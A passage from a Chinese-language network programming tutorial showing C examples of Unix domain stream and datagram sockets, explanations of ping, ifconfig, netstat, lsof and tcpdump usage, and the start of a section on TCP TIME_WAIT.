  <span class="token keyword">if</span> <span class="token punctuation">(</span>sockfd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"create socket failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sun_family <span class="token operator">=</span> AF_LOCAL<span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">.</span>sun_path<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// sun_path 初始化，表示目标文件路径</span>     <span class="token comment">// 发起对目标套接字的 connect 调用</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">connect</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"connect failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token comment">// 从标准输入中读取字符串</span>    <span class="token keyword">char</span> send_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> recv_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">fgets</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token keyword">int</span> nbytes <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 向服务器端发送</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">write</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> send_line<span class="token punctuation">,</span> nbytes<span class="token punctuation">)</span> <span class="token operator">!=</span> nbytes<span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"write error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">read</span><span class="token punctuation">(</span>sockfd<span class="token punctuation">,</span> recv_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"server terminated prematurely"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token function">fputs</span><span class="token punctuation">(</span>recv_line<span class="token punctuation">,</span> <span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>运行</p><ul><li><p>只启动客户端</p><ul><li>客户端直接报错，提示没有文件存在</li></ul></li><li><p>服务器端监听在无权限的文件路径上</p><ul><li>启动服务器端程序的用户，必须对本地监听路径有权限</li></ul></li><li><p>服务器和客户端正常启动</p><p><img src="20220505-201747.png" alt=""></p></li></ul></li></ul><h4 id="1-7-3-本地数据报套接字">1.7.3 本地数据报套接字</h4><ul><li><p>服务端</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span>  <span class="token string">"lib/common.h"</span></span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"usage: unixdataserver &lt;local_path&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">int</span> socket_fd<span class="token punctuation">;</span>    socket_fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_LOCAL<span class="token punctuation">,</span> SOCK_DGRAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>socket_fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"socket create failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> servaddr<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>local_path <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sun_family <span class="token operator">=</span> AF_LOCAL<span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">.</span>sun_path<span class="token punctuation">,</span> local_path<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"bind failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> client_addr<span class="token punctuation">;</span>    socklen_t client_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>client_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 使用 recvfrom 和 sendto 来进行数据报的收发</span>        <span class="token function">bzero</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">recvfrom</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> BUFFER_SIZE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockadd</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>client_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>client_len<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"client quit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Receive: %s \n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">char</span> send_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">bzero</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> <span class="token string">"Hi, %s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>         size_t nbytes <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now sending: %s \n"</span><span class="token punctuation">,</span> send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sendto</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> send_line<span class="token punctuation">,</span> nbytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockadd</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>client_addr<span class="token punctuation">,</span> client_len<span class="token punctuation">)</span> <span class="token operator">!=</span> nbytes<span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"sendto error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token function">close</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>客户端</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span>  <span class="token string">"lib/common.h"</span></span> <span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">!=</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"usage: unixdataserver &lt;local_path&gt;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">int</span> socket_fd<span class="token punctuation">;</span>    socket_fd <span class="token operator">=</span> <span class="token function">socket</span><span class="token punctuation">(</span>AF_LOCAL<span class="token punctuation">,</span> SOCK_DGRAM<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>socket_fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"socket create failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> servaddr<span class="token punctuation">;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>local_path <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>local_path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">bzero</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    servaddr<span class="token punctuation">.</span>sun_family <span class="token operator">=</span> AF_LOCAL<span class="token punctuation">;</span>    <span class="token function">strcpy</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">.</span>sun_path<span class="token punctuation">,</span> local_path<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">// 指定一个本地路径，以便在服务器端回包时可以正确地找到地址</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">bind</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockaddr</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>servaddr<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>servaddr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"bind failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token keyword">char</span> buf<span class="token punctuation">[</span>BUFFER_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">struct</span> <span class="token class-name">sockaddr_un</span> client_addr<span class="token punctuation">;</span>    socklen_t client_len <span class="token operator">=</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>client_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">bzero</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">recvfrom</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> BUFFER_SIZE<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockadd</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>client_addr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>client_len<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"client quit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Receive: %s \n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">char</span> send_line<span class="token punctuation">[</span>MAXLINE<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">bzero</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> MAXLINE<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">sprintf</span><span class="token punctuation">(</span>send_line<span class="token punctuation">,</span> <span class="token string">"Hi, %s"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>         size_t nbytes <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"now sending: %s \n"</span><span class="token punctuation">,</span> send_line<span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">sendto</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">,</span> send_line<span class="token punctuation">,</span> nbytes<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">sockadd</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>client_addr<span class="token punctuation">,</span> client_len<span class="token punctuation">)</span> <span class="token operator">!=</span> nbytes<span class="token punctuation">)</span>            <span class="token function">error</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> errno<span class="token punctuation">,</span> <span class="token string">"sendto error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>     <span class="token function">close</span><span class="token punctuation">(</span>socket_fd<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>运行</p><p><img src="20220505-202723.png" alt=""></p></li></ul><h3 id="工具使用">工具使用</h3><h4 id="ping">ping</h4><ul><li><p>ping 命名来自于声呐探测，在网络上用来完成对网连通性的探测</p></li><li><p>ping 基于<a href="">ICMP协议</a>（网际控制协议）开发</p></li><li><p>例：使用 ping 探测和新浪网的网络连通性</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210401-ping.png" alt=""></p><ul><li>每次显示是按照 sequence 序列号排序</li><li>显示了 <strong>TTL</strong>，反映两个 IP 地址之间传输的时间</li><li>还显示了 ping 命令的统计信息，如最小时间、平均时间等</li></ul></li></ul><p>​</p><p>​</p><h4 id="ifconfig">ifconfig</h4><ul><li><p>用来显示当前系统中的所有网络设备（网卡列表）</p></li><li><p>示例</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210401-ifconfig.png" alt=""></p><ul><li><p>第一行：<code>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;</code>：网络设备的状态标识</p><ul><li>UP：网卡开启状态</li><li>BROADCAST：网卡有广播地址，可发送广播</li><li>RUNNING：网线处于连接状态</li><li>MULTICAST：表示网卡可以发送多播包</li></ul><p><code>mtu 1500</code>：最大传输单元 MTU 为 1500，表示的是链路层包的大小，这是以太网的默认值，规定连 MAC 头带正文合起来，不允许超过 1500 个字节，<strong>如果放不下就需要分片来传输</strong></p></li><li><p>第二行：<code>inet 192.168.121.143  netmask 255.255.255.0  broadcast 192.168.121.255</code>：网卡的IP地址、子网掩码、广播地址</p></li><li><p>第三行：IPV6配置信息</p></li><li><p>第四行：<code>ether 52:00:74:f8:9f:56  txqueuelen 0  (Ethernet)</code>：网卡的MAC地址</p><ul><li><p><code>ether</code>：连接类型为以太网</p></li><li><p><code>txqueuelen</code>：传输队列的长度</p></li></ul></li><li><p>第五六行：网卡接受数据包的统计信息和接受错误的统计信息</p></li><li><p>第七八行：网卡发送数据包的统计信息和发送错误的统计信息</p></li></ul></li><li><p><a href="https://night-candle.github.io/2021/02/04/cs-network-protocol/#toc-heading-36">ip addr命令</a></p></li></ul><p>​</p><p>​</p><h4 id="netstat">netstat</h4><ul><li><p>netstat（network statistics）是在内核中访问网络连接状态及其相关信息的命令行程序，可以显示路由表、实际的网络连接和网络接口设备的状态信息，以及与 IP、TCP、UDP、ICMP 协议相关的统计数据，一般用于检验本机各端口的网络服务运行状况</p></li><li><p>命令选项</p><ul><li><em>-a</em>：列出 TCP、UDP 和 Unix 协议下所有套接字的所有连接</li><li><em>-t</em>：列出 TCP 协议的连接，可和 <em>-a</em>选项配合使用</li><li><em>-u</em>：列出 UDP 协议的连接</li><li><em>-n</em>：禁用反向域名解析，加快查询速度，用户 ID 和端口号也优先使用数字显示</li><li><em>-l</em>：只列出正在监听的连接（不能和 <em>-a</em> 选项同时使用）</li><li><em>-p</em>：查看进程信息<ul><li><em>-pe</em>：同时查看进程名和进程所属的用户名</li></ul></li><li><em>-s</em>：输出针对不同网络协议的统计信息</li></ul></li><li><p>当前所有的连接详情</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">netstat <span class="token operator">-</span>apen<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>​</p><p>​</p><h4 id="lsof">lsof</h4><ul><li><p>常见用途之一是找出在指定的 IP 地址或者端口上打开套接字的进程</p></li><li><p>Isof 和 netstst 可以结合使用</p></li><li><p>lsof 可以找出正在使用该端口的进程，从而帮助定位问题</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">lsof <span class="token operator">-</span>i <span class="token operator">:</span><span class="token number">8080</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ul><p>​</p><p>​</p><h4 id="tcpdump">tcpdump</h4><ul><li><p>抓包工具，具有非常强大的过滤和匹配功能</p></li><li><p>在开启抓包时 tcpdump 会自动创建一个类型为 AF_PACKET 的网络套接口，并向系统内核注册，当网卡接收到一个网络报文之后，会遍历系统中所有已经被注册的网络协议，内核接下来就会将网卡收到的报文发送给该协议的回调函数进行处理，回调函数可以把接收到的报文复制一份交给 tcpdump 程序，进行各种条件的过滤和判断后对报文进行解析输出</p></li><li><p>命令选项</p><ul><li><em>-D</em>：列出可用于抓包的接口</li><li><em>-i</em>：指定监听的网卡，<code>-i any</code> 显示所有网卡</li><li><em>-c</em>：指定要抓取的包数量</li><li><em>-nn</em>：不做主机名解析，且端口显示为数值</li><li><em>-w</em>：将抓包数据输出到文件中而不是标准输出，可以同时配合*-G time*选项使得输出文件每 time 秒就自动切换到另一个文件（保存成 cap 格式配合 wireshark）</li><li><em>-r</em>：从给定数据包文件中读取数据，使用<code>-</code>表示从标准输入中读取</li></ul></li><li><p>tcpdump 表达式：用于筛选输出</p><ul><li><p>表达式由一个或多个单元组成，每个单元一般包含 ID 的修饰符和一个 ID（数字或名称）</p></li><li><p>有三种修饰符</p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220506-tcpdump-filter.jpg" style="zoom: 50%;"><ul><li><p>proto：可选有 ip、arp、rarp、tcp、udp、icmp、ether 等，默认是所有协议的包</p></li><li><p>dir：可选有 src、dst、src or dst、src and dst，默认为 src or dst</p></li><li><p>type：可选有 host、net、port、portrange，默认为 host</p></li></ul></li><li><p>表达式单元之间可以使用操作符 <code>and / &amp;&amp; / or / || / not / !</code> 进行连接，从而组成复杂的条件表达式</p></li><li><p>在表达式中出现的 shell 元字符建议使用单引号包围</p></li></ul></li><li><p>示例：</p><ul><li><p>查看 TCP，且端口是 80，来自 IP 地址为 192.168.1.25 的包</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">tcpdump <span class="token string">'tcp and port 80 and src host 192.168.1.25'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>查看 TCP，设置了 SYN 分节的且端口是 80 的包</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">tcpdump <span class="token string">'tcp and port 80 and tcp[13:1]&amp;2 != 0'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>tcp[13:1]</code> 表示的是 TCP 头部开始处偏移为 13 的字节，如果这个值为 2，说明设置了 SYN 分节</li></ul></li></ul></li><li><p>输出格式</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20210401-tcpdump-output.jpg" alt=""></p><ul><li><p><code>Flags [ ]</code> 是包的标志，比较常见的包格式如下：</p><ul><li><code>[S]</code>：SYN，表示开始连接</li><li><code>[.]</code>：没有标记，一般是确认</li><li><code>[P]</code>：PSH，表示数据推送</li><li><code>[F]</code>：FIN，表示结束连接</li><li><code>[R]</code>：RST，表示重启连接</li></ul></li><li><p>seq：包序号，就是 TCP 的确认分组</p></li><li><p>cksum：校验码</p></li><li><p>win：滑动窗口大小</p></li><li><p>length：载荷的长度</p></li></ul></li></ul><p>​</p><p>​</p><h2 id="02-网络编程进阶">02 | 网络编程进阶</h2><h3 id="TIME-WAIT">TIME_WAIT</h3><ul><li>场景引入：应用服务需要通过发起 TCP 连接对外提供服务，在高并发情况下，TIME_WAIT 状态的连接过多，把本机可用的端口耗尽，应用服务对外表现为不能正常工作，一段时间后处于 TIME_WAIT 的连接被系统回收并关闭后，释放出本地端口，应用服务对外表现为可以正常工作</li></ul><h4 id="TCP-四次挥手">TCP 四次挥手</h4><ul><li><p>TCP 四次挥手过程</p><p><img src="https://raw.githubusercontent.com/night-candle/figurebed/main/img/20220506-four-time-wave.png" alt=""></p><ul><li>主动关闭方 TCP 发送 FIN 包，表示需要关闭连接，之后主动关闭方进入 FIN_WAIT_1 状态</li><li>收到 FIN 包的对端执行被动关闭，进入 <code>CLOSE_WAIT</code> 状态，并发送一个 ACK 应答<ul><li>TCP 协议栈为 FIN 包插入一个文件结束符 EOF 到接收缓冲区中，应用程序可以通过 read 调用来感知这个 FIN 包</li></ul></li><li>read 调用获得 EOF，并将此结果通知应用程序调用 close 关闭它的套接字，也发送一个 FIN 包，被动关闭方将进入 <code>LAST_ACK</code> 状态</li><li>主动关闭方接收到对方的 FIN 包，并确认这个 FIN 包，主动关闭方进入 <code>TIME_WAIT</code> 状态，而接收到 ACK 的被动关闭方则进入 <code>CLOSED</code> 状态</li><li>经过 2MSL 时间之后，主动关闭方也进入 <code>CLOSED</code> 状态</li><li>注意：<ul><li><strong>只有发起连接终止的一方会进入 TIME_WAIT 状态</strong></li><li>中间使用 <a href="#shutdown">shutdown</a>，执行一端到另一端的半关闭也是可以的</li></ul></li></ul></li><li><p>大多数真实情况是客户端执行主动关闭，HTTP/1.0 却是由服务器发起主动关闭的</p></li><li><p>主机在 TIME_WAIT 停留持续时间是固定的，是最长分节生命期 MSL（maximum segment lifetime）的两倍，一般称之为 2MSL，时间是从主机 1 接收到 FIN 后发送 ACK 开始计时的，如果在 TIME_WAIT 时间内又接收到了主机 2 重发的 FIN 报文，那么 2MSL 时间将重新计时（目的是为了让旧连接的所有报文都能自然消亡）</p></li><li><p>Linux 里有一个硬编码的字段 <code>TCP_TIMEWAIT_LEN</code> 值为 60 秒，Linux 停留在 TIME_WAIT 的时间为固定的 60 秒</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token expression"><span class="token function">TCP_TIMEWAIT_LEN</span> <span class="token punctuation">(</span><span class="token number">60</span><span class="token operator">*</span>HZ<span class="token punctuation">)</span> </span><span class="token comment">/* how 